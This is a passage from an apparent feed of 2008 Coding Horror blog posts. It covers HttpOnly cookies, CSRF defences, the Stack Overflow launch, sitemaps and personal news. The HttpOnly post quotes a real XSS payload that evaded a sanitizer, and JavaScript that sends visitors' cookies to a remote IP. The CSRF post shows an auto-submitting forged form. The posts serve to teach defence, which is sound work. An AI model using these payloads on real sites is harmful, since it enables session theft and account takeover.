Imagine, then, the surprise of my friend when he noticed some enterprising users on his website <b>were logged in as him</b> and happily banging away on the system with full unfettered administrative privileges.
</p>
<p>
How did this happen? XSS, of course. It all started with this bit of script added to a user's profile page.
</p>
<p>
</p>
<pre>
&lt;img src=""http://www.a.com/a.jpg&lt;script type=text/javascript
src="http://1.2.3.4:81/xss.js"&gt;" /&gt;&lt;&lt;img
src=""http://www.a.com/a.jpg&lt;/script&gt;"
</pre>
<p>
Through clever construction, the malformed URL just manages to squeak past the sanitizer. The final rendered code, when viewed in the browser, loads and executes a script from that remote server. Here's what that JavaScript looks like:
</p>
<p>
</p>
<pre>
window.location="http://1.2.3.4:81/r.php?u="
+document.links[1].text
+"&amp;l="+document.links[1]
+"&amp;c="+document.cookie;
</pre>
<p>
That's right -- whoever loads this script-injected user profile page has just unwittingly <b>transmitted their browser cookies to an evil remote server!</b>
</p>
<p>
As we've already established, once someone has your browser cookies for a given website, they essentially have the keys to the kingdom for your identity there. If you don't believe me, get the <a href="https://addons.mozilla.org/en-US/firefox/addon/573">Add N Edit cookies extension</a> for Firefox and try it yourself. Log into a website, copy the essential cookie values, then paste them into another browser running on another computer. That's all it takes. It's quite an eye opener.
</p>
<p>
If cookies are so precious, you might find yourself asking why <b>browsers don't do a better job of protecting their cookies</b>. I know my friend was. Well, there is a way to protect cookies from most malicious JavaScript: HttpOnly cookies.
</p>
<p>
When you tag a cookie with the HttpOnly flag, it tells the browser that <b>this particular cookie should only be accessed by the server</b>. Any attempt to access the cookie from client script is strictly forbidden. Of course, this presumes you have:
</p>
<p>
</p>
<ol>
<li>A modern web browser
</li>
<li>A browser that actually implements HttpOnly correctly
</li>
</ol>
<p>
The good news is that most modern browsers do support the HttpOnly flag: Opera 9.5, Internet Explorer 7, and Firefox 3. I'm not sure if the latest versions of Safari do or not. It's sort of ironic that the HttpOnly flag was pioneered by Microsoft in hoary old Internet Explorer 6 SP1, a bowser which isn't exactly known for its iron-clad security record.
</p>
<p>
Regardless, <b>HttpOnly cookies are a great idea, and properly implemented, make huge classes of common XSS attacks much harder to pull off.</b> Here's what a cookie looks like with the HttpOnly flag set:
</p>
<p>
</p>
<pre>
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/7.0
<b>Set-Cookie: ASP.NET_SessionId=ig2fac55; path=/; <font color="red">HttpOnly</font></b>
X-AspNet-Version: 2.0.50727
<b>Set-Cookie: user=t=bfabf0b1c1133a822; path=/; <font color="red">HttpOnly</font></b>
X-Powered-By: ASP.NET
Date: Tue, 26 Aug 2008 10:51:08 GMT
Content-Length: 2838
</pre>
<p>
This isn't exactly news; Scott Hanselman <a href="http://www.hanselman.com/blog/HttpOnlyCookiesOnASPNET11.aspx">wrote about HttpOnly</a> a while ago. I'm not sure he understood the implications, as he was quick to dismiss it as "slowing down the average script kiddie for 15 seconds". In his defense, this was way back in 2005. A dark, primitive time. Almost pre YouTube.
</p>
<p>
HttpOnly cookies can in fact be remarkably effective. Here's what we know:
</p>
<p>
</p>
<ul>
<li>HttpOnly restricts all access to <code>document.cookie</code> in IE7, Firefox 3, and Opera 9.5 (unsure about Safari)
</li>
<li>HttpOnly removes cookie information from the response headers in <code>XMLHttpObject.getAllResponseHeaders()</code> in IE7. It should do the same thing in Firefox, but it doesn't, because <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=380418">there's a bug</a>.
</li>
<li>
<code>XMLHttpObjects</code> may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.
</li>
</ul>
<p>
The big security hole, as alluded to above, is that Firefox (and presumably Opera) allow access to the headers through <code>XMLHttpObject</code>. So you could make a trivial JavaScript call back to the local server, get the headers out of the string, and then post that back to an external domain. Not as easy as <code>document.cookie</code>, but hardly a feat of software engineering.
</p>
<p>
Even with those caveats, I believe HttpOnly cookies are a huge security win. If I -- er, I mean, if my friend -- had implemented HttpOnly cookies, <b>it would have totally protected his users from the above exploit!</b>
</p>
<p>
HttpOnly cookies don't make you immune from XSS cookie theft, but they raise the bar considerably. It's practically free, a "set it and forget it" setting that's bound to become increasingly secure over time as more browsers follow the example of IE7 and implement client-side HttpOnly cookie security correctly. If you develop web applications, or you know anyone who develops web applications, <b>make sure they know about HttpOnly cookies.</b>
</p>
<p>
Now I just need to go tell my friend about them. I'm not sure why I bother. He never listens to me anyway.
</p>
<p>
(Special thanks to Shawn <i>expert developer</i> Simon for his assistance in constructing this post.)
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-28T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/protecting-your-cookies-httponly/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Spawning a New Process ]]></title>
<link>https://blog.codinghorror.com/spawning-a-new-process/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I don't usually talk about my personal life here, but I have to make an exception in this case.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I debated for days which geeky reference I would use as a synonym for "we're having a baby". The title is the best I could do. I'm truly sorry.
</p>
<p>
As an aside, this is something my wife and I have worked at for a number of years, and was only truly possible through <a href="http://en.wikipedia.org/wiki/IVF">the Miracle of Science</a><sup>tm</sup>. Despite the best of intentions, you really start to resent all those teenage couples who manage to get pregnant so awkwardly and accidentally. Oh, that's right! You have <i>sex!</i> It's so obvious in retrospect!
</p>
<p>
Not that managing to procreate is anything special compared to programming. Just <a href="http://edward.oconnor.cx/2005/04/rms">ask the inestimable Richard Stallman</a>:
</p>
<p>
</p>
<blockquote>
It doesn't take special talents to reproduce -- even plants can do it. On the other hand, contributing to a program like Emacs takes real skill. That is really something to be proud of.
<p>
It helps more people, too.
</p>
</blockquote>
<p>
At any rate, <b>I'm looking forward to stocking our unborn child's mind with all my insane, crazy ideas.</b> I think Dave Eggers said it best in <a href="http://www.amazon.com/dp/0375725784/?tag=codihorr-20">A Heartbreaking Work of Staggering Genius</a>, describing a road trip he took with his younger brother after the death of his parents:
</p>
<p>
</p>
<blockquote>
His brain is my laboratory, my depository. Into it I can stuff the books I choose, the television shows, the movies, my opinion about elected officials, historical events, neighbors, passersby. He is my twenty-four-hour classroom, my captive audience, forced to ingest everything I deem worthwhile. He is a lucky, lucky boy! And no one can stop me. He is mine, and you cannot stop me, cannot stop us. Try to stop us, you pu**y! You can't stop us from singing, and you can't stop us from making fart sounds, from putting our hands out the window to test the aerodynamics of different hand formations, from wiping the contents of our noses under the front of our seats.
<p>
We cannot be stopped from looking with pity upon all the world's sorry inhabitants, they unblessed by our charms, unchallenged by our trials, unscarred and thus weak, gelatinous. You cannot stop me from telling Toph to make comments about and faces at the people in the next lane.
</p>
<p>
It's unfair. The matchups, Us. v. Them (or you) are unfair. We are dangerous. We are daring and immortal. Fog whips up from under the cliffs and billows over the highway. Blue breaks from beyond the fog and sun suddenly screams from the blue.
</p>
</blockquote>
<p>
I guess what I'm trying to say is that, with any luck, he or she will be scarred for life. That's a proud family tradition where I come from.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-09-07T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/spawning-a-new-process/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Stack Overflow: None of Us is as Dumb as All of Us ]]></title>
<link>https://blog.codinghorror.com/stack-overflow-none-of-us-is-as-dumb-as-all-of-us/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I'm in no way trying to conflate this with the meaning of <a href="http://www.codinghorror.com/blog/archives/001168.html">my last blog</a> post, but after a six month gestation, we just gave birth to a public website.
</p>
<p>
<a href="http://stackoverflow.com"><img alt="image placeholder" >
</p>
<p>
Of course, I'm making a sly little joke here about community, but I really believe in this stuff. <a href="http://stackoverflow.com">Stack Overflow</a> is, as much as I could make it, an effort of <b>collective programmer community</b>.
</p>
<p>
Here's the original <a href="http://www.codinghorror.com/blog/archives/000351.html">vision statement</a> for Stack Overflow from <a href="http://www.codinghorror.com/blog/archives/001101.html">back in April</a>:
</p>
<p>
</p>
<blockquote>
So what <i>is</i> stackoverflow?
<p>
From day one, my blog has been about putting helpful information out into the world. I never had any particular aspirations for this blog to become what it is today; I'm humbled and gratified by its <a href="http://www.codinghorror.com/blog/archives/000983.html">amazing success</a>. It has quite literally changed my life. Blogs are fantastic resources, but as much as I might <a href="http://steve.yegge.googlepages.com/you-should-write-blogs">encourage my fellow programmers to blog</a>, not everyone has the time or inclination to start a blog. There's far too much great programming information trapped in forums, buried in online help, or hidden away in <a href="http://www.codinghorror.com/blog/archives/000971.html">books that nobody buys any more</a>. We'd like to unlock all that. Let's create something that makes it easy to participate, and put it online in a form that is trivially easy to find.
</p>
<p>
Are you familiar with <a href="http://everything2.com/index.pl?node_id=1441060">the movie pitch formula</a>?
</p>
<p>
<b>Stackoverflow is sort of like the anti-<a href="http://experts-exchange.com/">experts-exchange</a> (minus the nausea-inducing sleaze and quasi-legal search engine gaming) meets <a href="http://www.wikipedia.com/">wikipedia</a> meets <a href="http://programming.reddit.com/">programming reddit</a>.</b> It is by programmers, for programmers, with the ultimate intent of collectively increasing the sum total of <i>good</i> programming knowledge in the world. No matter what programming language you use, or what operating system you call home. Better programming is our goal.
</p>
</blockquote>
<p>
Although reaction has generally been positive, there has been a bit of backlash. Some have promoted the idea that Stack Overflow will only contribute to the increasing dumbenation of the world's developers. I think this is, in a word, horsecrap. I liked Joel's response to this in <a href="https://stackoverflow.fogbugz.com/default.asp?W24224">podcast 21</a> (<a href="http://itc.conversationsnetwork.org/audio/download/ITC.SO-Episode21-2008.09.09.mp3">mp3</a>):
</p>
<p>
</p>
<blockquote>
And it is true that we are all, as developers, hopelessly incompetent. The goal of a site like Stack Overflow is to somehow share the correct knowledge wherever it may be as it is scattered throughout the universe, and to cause that to be voted up and to be spread amongst us. There's this big universe of dumb programmers, and I'm one of them, and we all have a little bit of knowledge. I may know how to do this thing in VB6 which may be useful to somebody one day who's trying to maintain some ridiculously old piece of crap code. We all have these little tiny pieces of information and if we can just contribute a little bit, that information gets amplified, and maybe a thousand other dumb developers will benefit from my one little piece of good information.
</blockquote>
<p>
And here's my response, from the same podcast episode, to all those who turn up their noses at community sites like this, preferring the input of "experts":
</p>
<p>
</p>
<blockquote>
The idea that you have all these experts waiting in the wings to do stuff is an illusion in my experience. There's really just a bunch of amateurs muddling along trying to do things together. The people that are truly experts are too busy to even help, right? And if the experts are too busy to help, what difference does it really make if there are experts at all. Because the whole point of this endeavor is helping other developers, and whether you're an expert or not, if you have no time to help, you're not really contributing to the solution.
</blockquote>
<p>
Stack Overflow is by no means done. We're still technically in public beta. But I believe what we have -- the confluence of wiki, discussion, blog, and reddit/digg ranking systems -- is a fair representation of our original vision for Stack Overflow.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
It's a place where a busy programmer can invest a few minutes with as little friction as possible, and get something tangible from the community in return.
</p>
<p>
But <b>who cares what <i>I</i> think</b>; my opinion holds no particular weight. I'm just a member. This is <b>our</b> site. You tell me: <a href="http://stackoverflow.com/">how dumb are we?</a>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-09-16T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/stack-overflow-none-of-us-is-as-dumb-as-all-of-us/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Bill Gates and Code Complete ]]></title>
<link>https://blog.codinghorror.com/bill-gates-and-code-complete/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
By now I'm sure you've at least heard of, if not already seen, the new <b>Windows Vista advertisements</b> featuring Bill Gates and Jerry Seinfeld. They haven't been well received, to put it mildly, but the <a href="http://www.youtube.com/watch?v=gBWPf1BWtkw">latest commercial</a> is actually not bad in its longer 4 minute version:
</p>
<p>
<object height="344" width="425"><param name="movie" value="http://www.youtube.com/v/gBWPf1BWtkw&amp;hl=en&amp;fs=1&amp;rel=0">
<param name="allowFullScreen" value="true">
<embed allowfullscreen="true" height="344" src="http://www.youtube.com/v/gBWPf1BWtkw&amp;hl=en&amp;fs=1&amp;rel=0" type="application/x-shockwave-flash" width="425"></embed></object>
</p>
<p>
On the whole, I'd call these ads opaque bordering on inane. Rumor has it the <a href="http://valleywag.com/5051455/microsoft-to-announce-jerry-seinfeld-ads-cancelled-tomorrow">entire thing has been cancelled</a>. It wasn't entirely unsuccessful, I suppose; the goal of advertising is to <a href="http://wilshipley.com/blog/2008/07/mojave-experiment-bad-science-bad.html">get people talking about it</a>. Even if every one of those conversations starts with "what the hell were they thinking", hey -- it's a conversation. About an ad. The ad agencies have won.
</p>
<p>
I guess Microsoft figured it had to do <i>something</i> to counter the <a href="http://www.youtube.com/results?search_query=get+a+mac+ad">long running "I'm a Mac, I'm a PC" ads</a> from Apple. I secretly love these ads, because the hidden subtext is that if you use a PC, <a href="http://www.slate.com/id/2143810">you're as cool as John Hodgman</a>:
</p>
<p>
</p>
<blockquote>
My problem with these ads begins with the casting. As the Mac character, Justin Long (who was in the forgettable movie Dodgeball and the forgettabler TV show Ed) is just the sort of unshaven, hoodie-wearing, hands-in-pockets hipster we've always imagined when picturing a Mac enthusiast. He's perfect. Too perfect. It's like Apple is parodying its own image while also cementing it. If the idea was to reach out to new types of consumers (the kind who aren't already evangelizing for Macs), they ought to have used a different type of actor.
<p>
Meanwhile, the PC is played by John Hodgman -- contributor to The Daily Show and This American Life, host of an amusing lecture series, and all-around dry-wit extraordinaire. Even as he plays the chump in these Apple spots, his humor and likability are evident. (Look at that hilariously perfect pratfall he pulls off in the spot titled "Viruses.") The ads pose a seemingly obvious question -- would you rather be the laid-back young dude or the portly old dweeb? -- but I found myself consistently giving the "wrong" answer: <b>I'd much sooner associate myself with Hodgman than with Long.</b>
</p>
</blockquote>
<p>
The sleight of hand breaks down a bit when you realize that Hodgman <a href="http://www.engadget.com/2006/10/05/interview-with-john-hodgman-the-pc-from-those-get-a-mac-ads/">actually uses Macs</a>, but that's advertising for you: <b>a giant pack of lies</b>. In other breaking news, water still wet, sky still blue.
</p>
<p>
The reason I bring this up is not to <a href="http://www.codinghorror.com/blog/archives/000796.html">fan the eternal flame of platform wars</a>, but to highlight one interesting little detail in the ad. At about 1:05, you'll see Gates reading a bedtime story to the family's son from some obscure technical tome or other. But not just <i>any</i> technical tome -- he's reading from the book that this very blog is named after, my all-time favorite programming book, <a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20">Steve McConnell's Code Complete</a>.
</p>
<p>
</p>
<blockquote>
You can use [the table driven method] approach in any object-oriented language. It's less error-prone, more maintainable and more efficient than lengthy if statements, case statements or copious subclasses. <b>The fact that a design uses inheritance and polymorphism doesn't make it a good design.</b> The rote object-oriented design described earlier in the "Object-Oriented Approach" section would require as much code as a rote functional design -- or more.
</blockquote>
<p>
The above is excerpted from Chapter 18 of "Table-Driven Methods", on page 423. You might argue that I have <a href="http://www.codinghorror.com/blog/archives/000531.html">an unhealthy fascination with Steve McConnell and Code Complete</a>. You wouldn't be wrong.
</p>
<p>
I'm probably preaching to the choir here, but I doubt it's a coincidence that Gates chose that particular book; I'm sure it's <a href="http://www.codinghorror.com/blog/archives/001108.html">one of his all time favorite books, too</a>.
</p>
<p>
Hat tip to Matthew Eckstein for pointing this one out!
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-09-18T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/bill-gates-and-code-complete/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Cross-Site Request Forgeries and You ]]></title>
<link>https://blog.codinghorror.com/cross-site-request-forgeries-and-you/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As the web becomes more and more pervasive, so do web-based security vulnerabilities. I talked a little bit about the most common web vulnerability, cross-site scripting, in <a href="http://www.codinghorror.com/blog/archives/001167.html">Protecting Your Cookies: HttpOnly</a>. Although XSS is incredibly dangerous, it's a fairly straightforward exploit to understand. <b>Do not allow users to insert arbitrary HTML on your site.</b> The name of the XSS game is sanitizing user input. If you stick to a whitelist based approach -- <i>only</i> allow input that you know to be good, and <i>immediately</i> discard anything else -- then you're usually well on your way to solving any XSS problems you might have.
</p>
<p>
I thought we had our website vulnerabilies licked with XSS. I was wrong. <a href="http://blog.codeville.net/2008/09/01/prevent-cross-site-request-forgery-csrf-using-aspnet-mvcs-antiforgerytoken-helper/">Steve Sanderson explains</a>:
</p>
<p>
</p>
<blockquote>
<b>Since XSS gets all the limelight, few developers pay much attention to another form of attack that's equally destructive and potentially far easier to exploit.</b> Your application can be vulnerable to cross-site request forgery (CSRF) attacks not because you the developer did something wrong (as in, failing to encode outputs leads to XSS), but simply because of how the whole Web is designed to work. Scary!
</blockquote>
<p>
It turns out I didn't understand how <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">cross-site request forgery</a>, also known as XSRF or CSRF, works. It's not complicated, necessarily, but it's more.. subtle.. than XSS.
</p>
<p>
Let's say we allow users to post images on our forum. What if one of our users posted this image?
</p>
<p>
</p>
<pre>
&lt;img src="http://foo.com/logout"&gt;
</pre>
<p>
Not really an image, true, but it will force the target URL to be retrieved by any random user who happens to browse that page -- <b>using their browser credentials!</b> From the webserver's perspective, there is no difference whatsoever between a real user initiated browser request and the above image URL retrieval.
</p>
<p>
If our logout page was a simple HTTP GET that required no confirmation, <b>every user who visited that page would immediately be logged out.</b> That's XSRF in action. Not necessarily dangerous, but annoying.  Not too difficult to envision much more destructive versions of this technique, is it?
</p>
<p>
There are two obvious ways around this sort of basic XSRF attack:
</p>
<p>
</p>
<ol>
<li>Use a HTTP POST form submission for logout, not a garden variety HTTP GET.
</li>
<li>Make the user confirm the logout.
</li>
</ol>
<p>
Easy fix, right? We probably should never have never done either of these things in the first place. Duh!
</p>
<p>
Not so fast. Even with both of the above fixes, you are <i>still</i> vulnerable to XSRF attacks. Let's say I took my own advice, and converted the logout form to a HTTP POST, with a big button titled "Log Me Out" confirming the action. What's to stop a malicious user from placing a form like this on their own website ..
</p>
<p>
</p>
<pre>
&lt;body onload="document.getElementById('f').submit()"&gt;
&lt;form id="f" action="http://foo.com/logout" method="post"&gt;
&lt;input name="Log Me Out" value="Log Me Out" /&gt;
&lt;/form&gt;
&lt;/body&gt;
</pre>
<p>
.. and then <b>convincing other users to click on it?</b>
</p>
<p>
Remember, the browser will happily act on this request, submitting this form along with all necessary cookies and credentials directly to your website.  Blam. Logged out. Exactly as if they had clicked on the "Log Me Out" button themselves.
</p>
<p>
Sure, it takes a tiny bit more social engineering to convince users to visit some random web page, but it's not much. And the possibilities for attack are enormous: with XSRF, <b>malicious users can initiate any arbitrary action they like on a target website</b>. All they need to do is trick unwary users of <i>your</i> website -- who already have a validated user session cookie stored in their browser -- into clicking on <i>their</i> links.
</p>
<p>
So what can we do to protect our websites from these kinds of cross site request forgeries?
</p>
<p>
</p>
<ol>
<li>
<b>Check the referrer</b>. The HTTP referrer, or HTTP "referer" as it is now permanently misspelled, should always come from your own domain. You could reject any form posts from alien referrers. However, this is risky, as some corporate proxies strip the referrer from all HTTP requests as an anonymization feature. You would end up potentially blocking legitimate users. Furthermore, spoofing the referrer value is extremely easy. All in all, a waste of time. Don't even bother with referrer checks.
<p></p>
</li>
<li>
<b>Secret hidden form value</b>. Send down a unique server form value with each form -- typically tied to the user session -- and validate that you get the same value back in the form post. The attacker can't simply scrape your remote form as the target user through JavaScript, thanks to same-domain request limits in the <code>XmlHttpRequest</code> function.
<p></p>
</li>
<li>
<b>Double submitted cookies</b>. It's sort of ironic, but another way to prevent XSRF, essentially a cookie-based exploit, is to <i>add more cookies!</i> Double submitting means sending the cookie both ways in every form request: first as a traditional header value, and again as a form value -- read via JavaScript and inserted. The trick here is that remote <code>XmlHttpRequest</code> calls can't read cookies. If either of the values don't match, discard the input as spoofed. The only downside to this approach is that it does require your users to have JavaScript enabled, otherwise their own form submissions will be rejected.
</li>
</ol>
<p>
If your web site is vulnerable to XSRF, you're in good company. <a href="http://4diggers.blogspot.com/2006/06/how-to-defeat-digg.html">Digg</a>, <a href="http://directwebremoting.org/blog/joe/2007/01/01/csrf_attacks_or_how_to_avoid_exposing_your_gmail_contacts.html">GMail</a>, and <a href="http://sourceforge.net/project/shownotes.php?release_id=307067">Wikipedia</a> have all been successfully attacked this way before.
</p>
<p>
Maybe you're already protected from XSRF. Some web frameworks provide built in protection for XSRF attacks, usually through unique form tokens. But do you know for sure? Don't make the same mistake I did! Understand how XSRF works and ensure you're protected <i>before</i> it becomes a problem.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-09-23T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/cross-site-request-forgeries-and-you/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Importance of Sitemaps ]]></title>
<link>https://blog.codinghorror.com/the-importance-of-sitemaps/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
So I've been busy with <a href="http://www.codinghorror.com/blog/archives/001169.html">this Stack Overflow thing</a> over the last two weeks. By way of apology, I'll share a little statistic you might find interesting: the <b>percentage of traffic from search engines</b> at <a href="http://stackoverflow.com/">stackoverflow.com</a>.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="400">
<tr>
<td>
<b>Sept 16th</b><br>one day after public launch</td>
<td>10%</td>
</tr>
<tr>
<td>
<b>October 11th</b><br>less than one month after public launch</td>
<td><font color="red">50%</font></td>
</tr>
</table>
<p>
I try to be politically correct in discussing web search, avoiding the g-word whenever possible, desperately attempting to preserve the illusion that web search is actually a competitive market. But it's becoming a transparent and cruel joke at this point. <b>When we say "web search" we mean one thing, and one thing only: Google</b>. <a href="http://www.skrenta.com/2006/12/googles_true_search_market_sha.html">Rich Skrenta explains</a>:
</p>
<p>
</p>
<blockquote>
I'm not a professional analyst, and my approach here is pretty back-of-the-napkin. Still, it confirms what those of us in the search industry have known for a long time.
<p>
The New York Times, for instance, gets nearly 6 times as much traffic from Google as it does from Yahoo. Tripadvisor gets 8 times as much traffic from Google vs. Yahoo.
</p>
<p>
Even Yahoo's own sites are no different. While it receives a greater fraction of Yahoo search traffic than average, Yahoo's own flickr service gets 2.4 times as much traffic from Google as it does from Yahoo.
</p>
<p>
My favorite example: According to Hitwise, [ex] Yahoo blogger Jeremy Zawodny gets 92% of his inbound search traffic from Google, and only 2.7% from Yahoo.
</p>
</blockquote>
<p>
That was written almost two years ago. Guess which way those numbers have gone since then?
</p>
<p>
Google generally does a great job, so they deserve their success wholeheartedly, but I have to tell you: Google's current position as <a href="http://www.skrenta.com/2007/01/winnertakeall_google_and_the_t.html">the start page for the internet</a> kind of scares the crap out of me, in a way that Microsoft's dominance over the desktop PC never did. I mean, monopoly power over a desktop PC is one thing -- but the internet is the whole of human knowledge, or something rapidly approaching that. Do we really trust one company to be a benevolent monopoly over.. well, <i>everything?</i>
</p>
<p>
But I digress. <b>Our public website isn't even a month old, and Google is already half our traffic</b>. I'm perfectly happy to feed Google the kind of quality posts (well, mostly) fellow programmers are creating on Stack Overflow. The traffic graph provided by Analytics is amusingly predictable, as well.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Giant peak of initial interest, followed by the inevitable trough of disillusionment, and then the growing weekly humpback pattern of a site that actually (shock and horror) appears to be <i>useful</i> to some people. Go figure. Guess they call it <a href="http://www.crackoverflow.com/">crackoverflow</a> for a reason.
</p>
<p>
We knew from the outset that Google would be a big part of our traffic, and I wanted us to rank highly in Google for one very selfish reason -- <b>writing search code is hard</b>. It's far easier to outsource the burden of search to Google and their legions of server farms than it is for our tiny development team to do it on our one itty-bitty server. At least not <i>well</i>.
</p>
<p>
I'm constantly looking up my own stuff via Google searches, and I guess I've gotten spoiled. I expect to type in a few relatively unique words from the title and have whatever web page I know is there appear instantly in front of me. For the first two weeks, this was definitely not happening reliably for Stack Overflow questions. I'd type in the <i>exact title</i> of a question and get nothing. Sometimes I'd even get copies of our content from evil RSS scraper sites that plug in their own ads of questionable provenance, which was downright depressing. Other times, I'd enter a question title and get a <i>perfect</i> match. Why was old reliable Google letting me down? Our site is simple, designed from the outset to be easy for search engines to crawl. What gives?
</p>
<p>
What I didn't understand was the importance of a little file called <a href="http://en.wikipedia.org/wiki/Sitemaps">sitemap.xml</a>.
</p>
<p>
On a Q&amp;A site like Stack Overflow, only the most recent questions are visible on the homepage. The URL to get to the <i>entire</i> list of questions looks like this:
</p>
<p>
</p>
<pre>
http://stackoverflow.com/questions
http://stackoverflow.com/questions?page=2
http://stackoverflow.com/questions?page=3
..
http://stackoverflow.com/questions?page=931
</pre>
<p>
Not particularly complicated. I naively thought Google would have no problem crawling all the questions in this format. But after two weeks, it wasn't happening. My teammate, Geoff, clued me in to <a href="http://www.google.com/support/webmasters/bin/answer.py?answer=40318&amp;topic=13450">Google's webmaster help page on sitemaps</a>:
</p>
<p>
</p>
<blockquote>
Sitemaps are particularly helpful if:
<p>
</p>
<ul>
<li>Your site has dynamic content.
</li>
<li>Your site has pages that aren't easily discovered by Googlebot during the crawl process - for example, pages featuring rich AJAX or Flash.
</li>
<li>Your site is new and has few links to it. (Googlebot crawls the web by following links from one page to another, so if your site isn't well linked, it may be hard for us to discover it.)
</li>
<li>Your site has a large archive of content pages that are not well linked to each other, or are not linked at all.
</li>
</ul>
</blockquote>
<p>
I guess I was spoiled by my previous experience with blogs, which are almost incestuously hyperlinked, where everything ever posted has a permanent and static hyperlink attached to it, with simple monthly and yearly archive pages. With more dynamic websites, this isn't necessarily the case. The pagination links on Stack Overflow were apparently enough to prevent full indexing.
</p>
<p>
Enter <code>sitemap.xml</code>. The file itself is really quite simple; it's basically a non-spammy, non-shady way to have a "page" full of links that you feed to search engines. A way that is officially supported and endorsed by all the major web search engines. An individual record looks something <a href="http://sitemaps.org/protocol.php">like this</a>:
</p>
<p>
</p>
<pre>
&lt;url&gt;
&lt;loc&gt;<b><a href="http://stackoverflow.com/questions/24109/c-ide-for-linux">http://stackoverflow.com/questions/24109/c-ide-for-linux</a></b>&lt;/loc&gt;
&lt;lastmod&gt;<b>2008-10-11</b>&lt;/lastmod&gt;
&lt;changefreq&gt;<b>daily</b>&lt;/changefreq&gt;
&lt;priority&gt;<b>0.6</b>&lt;/priority&gt;
&lt;/url&gt;
</pre>
<p>
The above element is repeated for each one of the ~27,000 questions on Stack Overflow at the moment. Most search engines assume the file is at the root of your site, but you can inform them of an alternate location through <a href="http://en.wikipedia.org/wiki/Robots.txt">robots.txt</a>:
</p>
<p>
</p>
<pre>
User-Agent: *
Allow: /
Sitemap: /sitemap.xml
</pre>
<p>
There are also limits on size. The <code>sitemaps.xml</code> file cannot exceed 10 megabytes in size, with no more than 50,000 URLs per file. But you can have multiple sitemaps in a sitemap index file, too. If you have millions of URLs, you can see where this starts to get hairy fast.
</p>
<p>
<b>I'm a little aggravated that we have to set up this special file for the Googlebot to do its job properly</b>; it seems to me that web crawlers should be able to spider down our simple paging URL scheme without me giving them an explicit assist.
</p>
<p>
The good news is that since we set up our <code>sitemaps.xml</code>, every question on Stack Overflow is eminently findable. But when 50% of your traffic comes from one source, perhaps it's best not to ask these kinds of questions.
</p>
<p>
<a href="http://kottke.org/06/09/pixelated-google-overlords"><img alt="image placeholder" >
</p>
<p>
Just smile and nod and follow the rules like everyone else. I, for one, <a href="http://kottke.org/06/09/pixelated-google-overlords">welcome our pixelated Google overlords!</a>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-12T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-importance-of-sitemaps/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Preventing CSRF and XSRF Attacks ]]></title>
<link>https://blog.codinghorror.com/preventing-csrf-and-xsrf-attacks/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In <a href="http://www.codinghorror.com/blog/archives/001171.html">Cross-Site Request Forgeries and You</a> I urged developers <b>to take a close look at possible CSRF / XSRF vulnerabilities on their own websites</b>. They're the worst kind of vulnerability -- very easy to exploit by attackers, yet not so intuitively easy to understand for software developers, at least until you've been bitten by one.
</p>
<p>
On the <a href="http://freedom-to-tinker.com/blog/wzeller/popular-websites-vulnerable-cross-site-request-forgery-attacks">Freedom to Tinker blog</a>, Bill Zeller offers one of the best, most concise explanation of XSRF that I've read to date:
</p>
<p>
</p>
<blockquote>
CSRF vulnerabilities occur when a website allows an authenticated user to perform a sensitive action but does not verify that the user herself is invoking that action. <b>The key to understanding CSRF attacks is to recognize that websites typically don't verify that a request came from an authorized user. Instead they verify only that the request came from the <i>browser</i> of an authorized user.</b> Because browsers run code sent by multiple sites, there is a danger that one site will (unbeknownst to the user) send a request to a second site, and the second site will mistakenly think that the user authorized the request.
</blockquote>
<p>
That's the key element to understanding XSRF. <b>Attackers are gambling that users have a validated login cookie for your website already stored in their browser.</b> All they need to do is get that browser to make a request to your website on their behalf. If they can either:
</p>
<p>
</p>
<ol>
<li>Convince your users to click on a HTML page they've constructed
</li>
<li>Insert arbitrary HTML in a target website that your users visit
</li>
</ol>
<p>
The XSRF game is afoot. Not too difficult, is it?
</p>
<p>
Bill Zeller and Ed Felten also <a href="http://freedom-to-tinker.com/blog/wzeller/popular-websites-vulnerable-cross-site-request-forgery-attacks">identified new XSRF vulnerabilities in four major websites</a> less than two weeks ago:
</p>
<p>
</p>
<ol>
<li>ING Direct
<br><br>
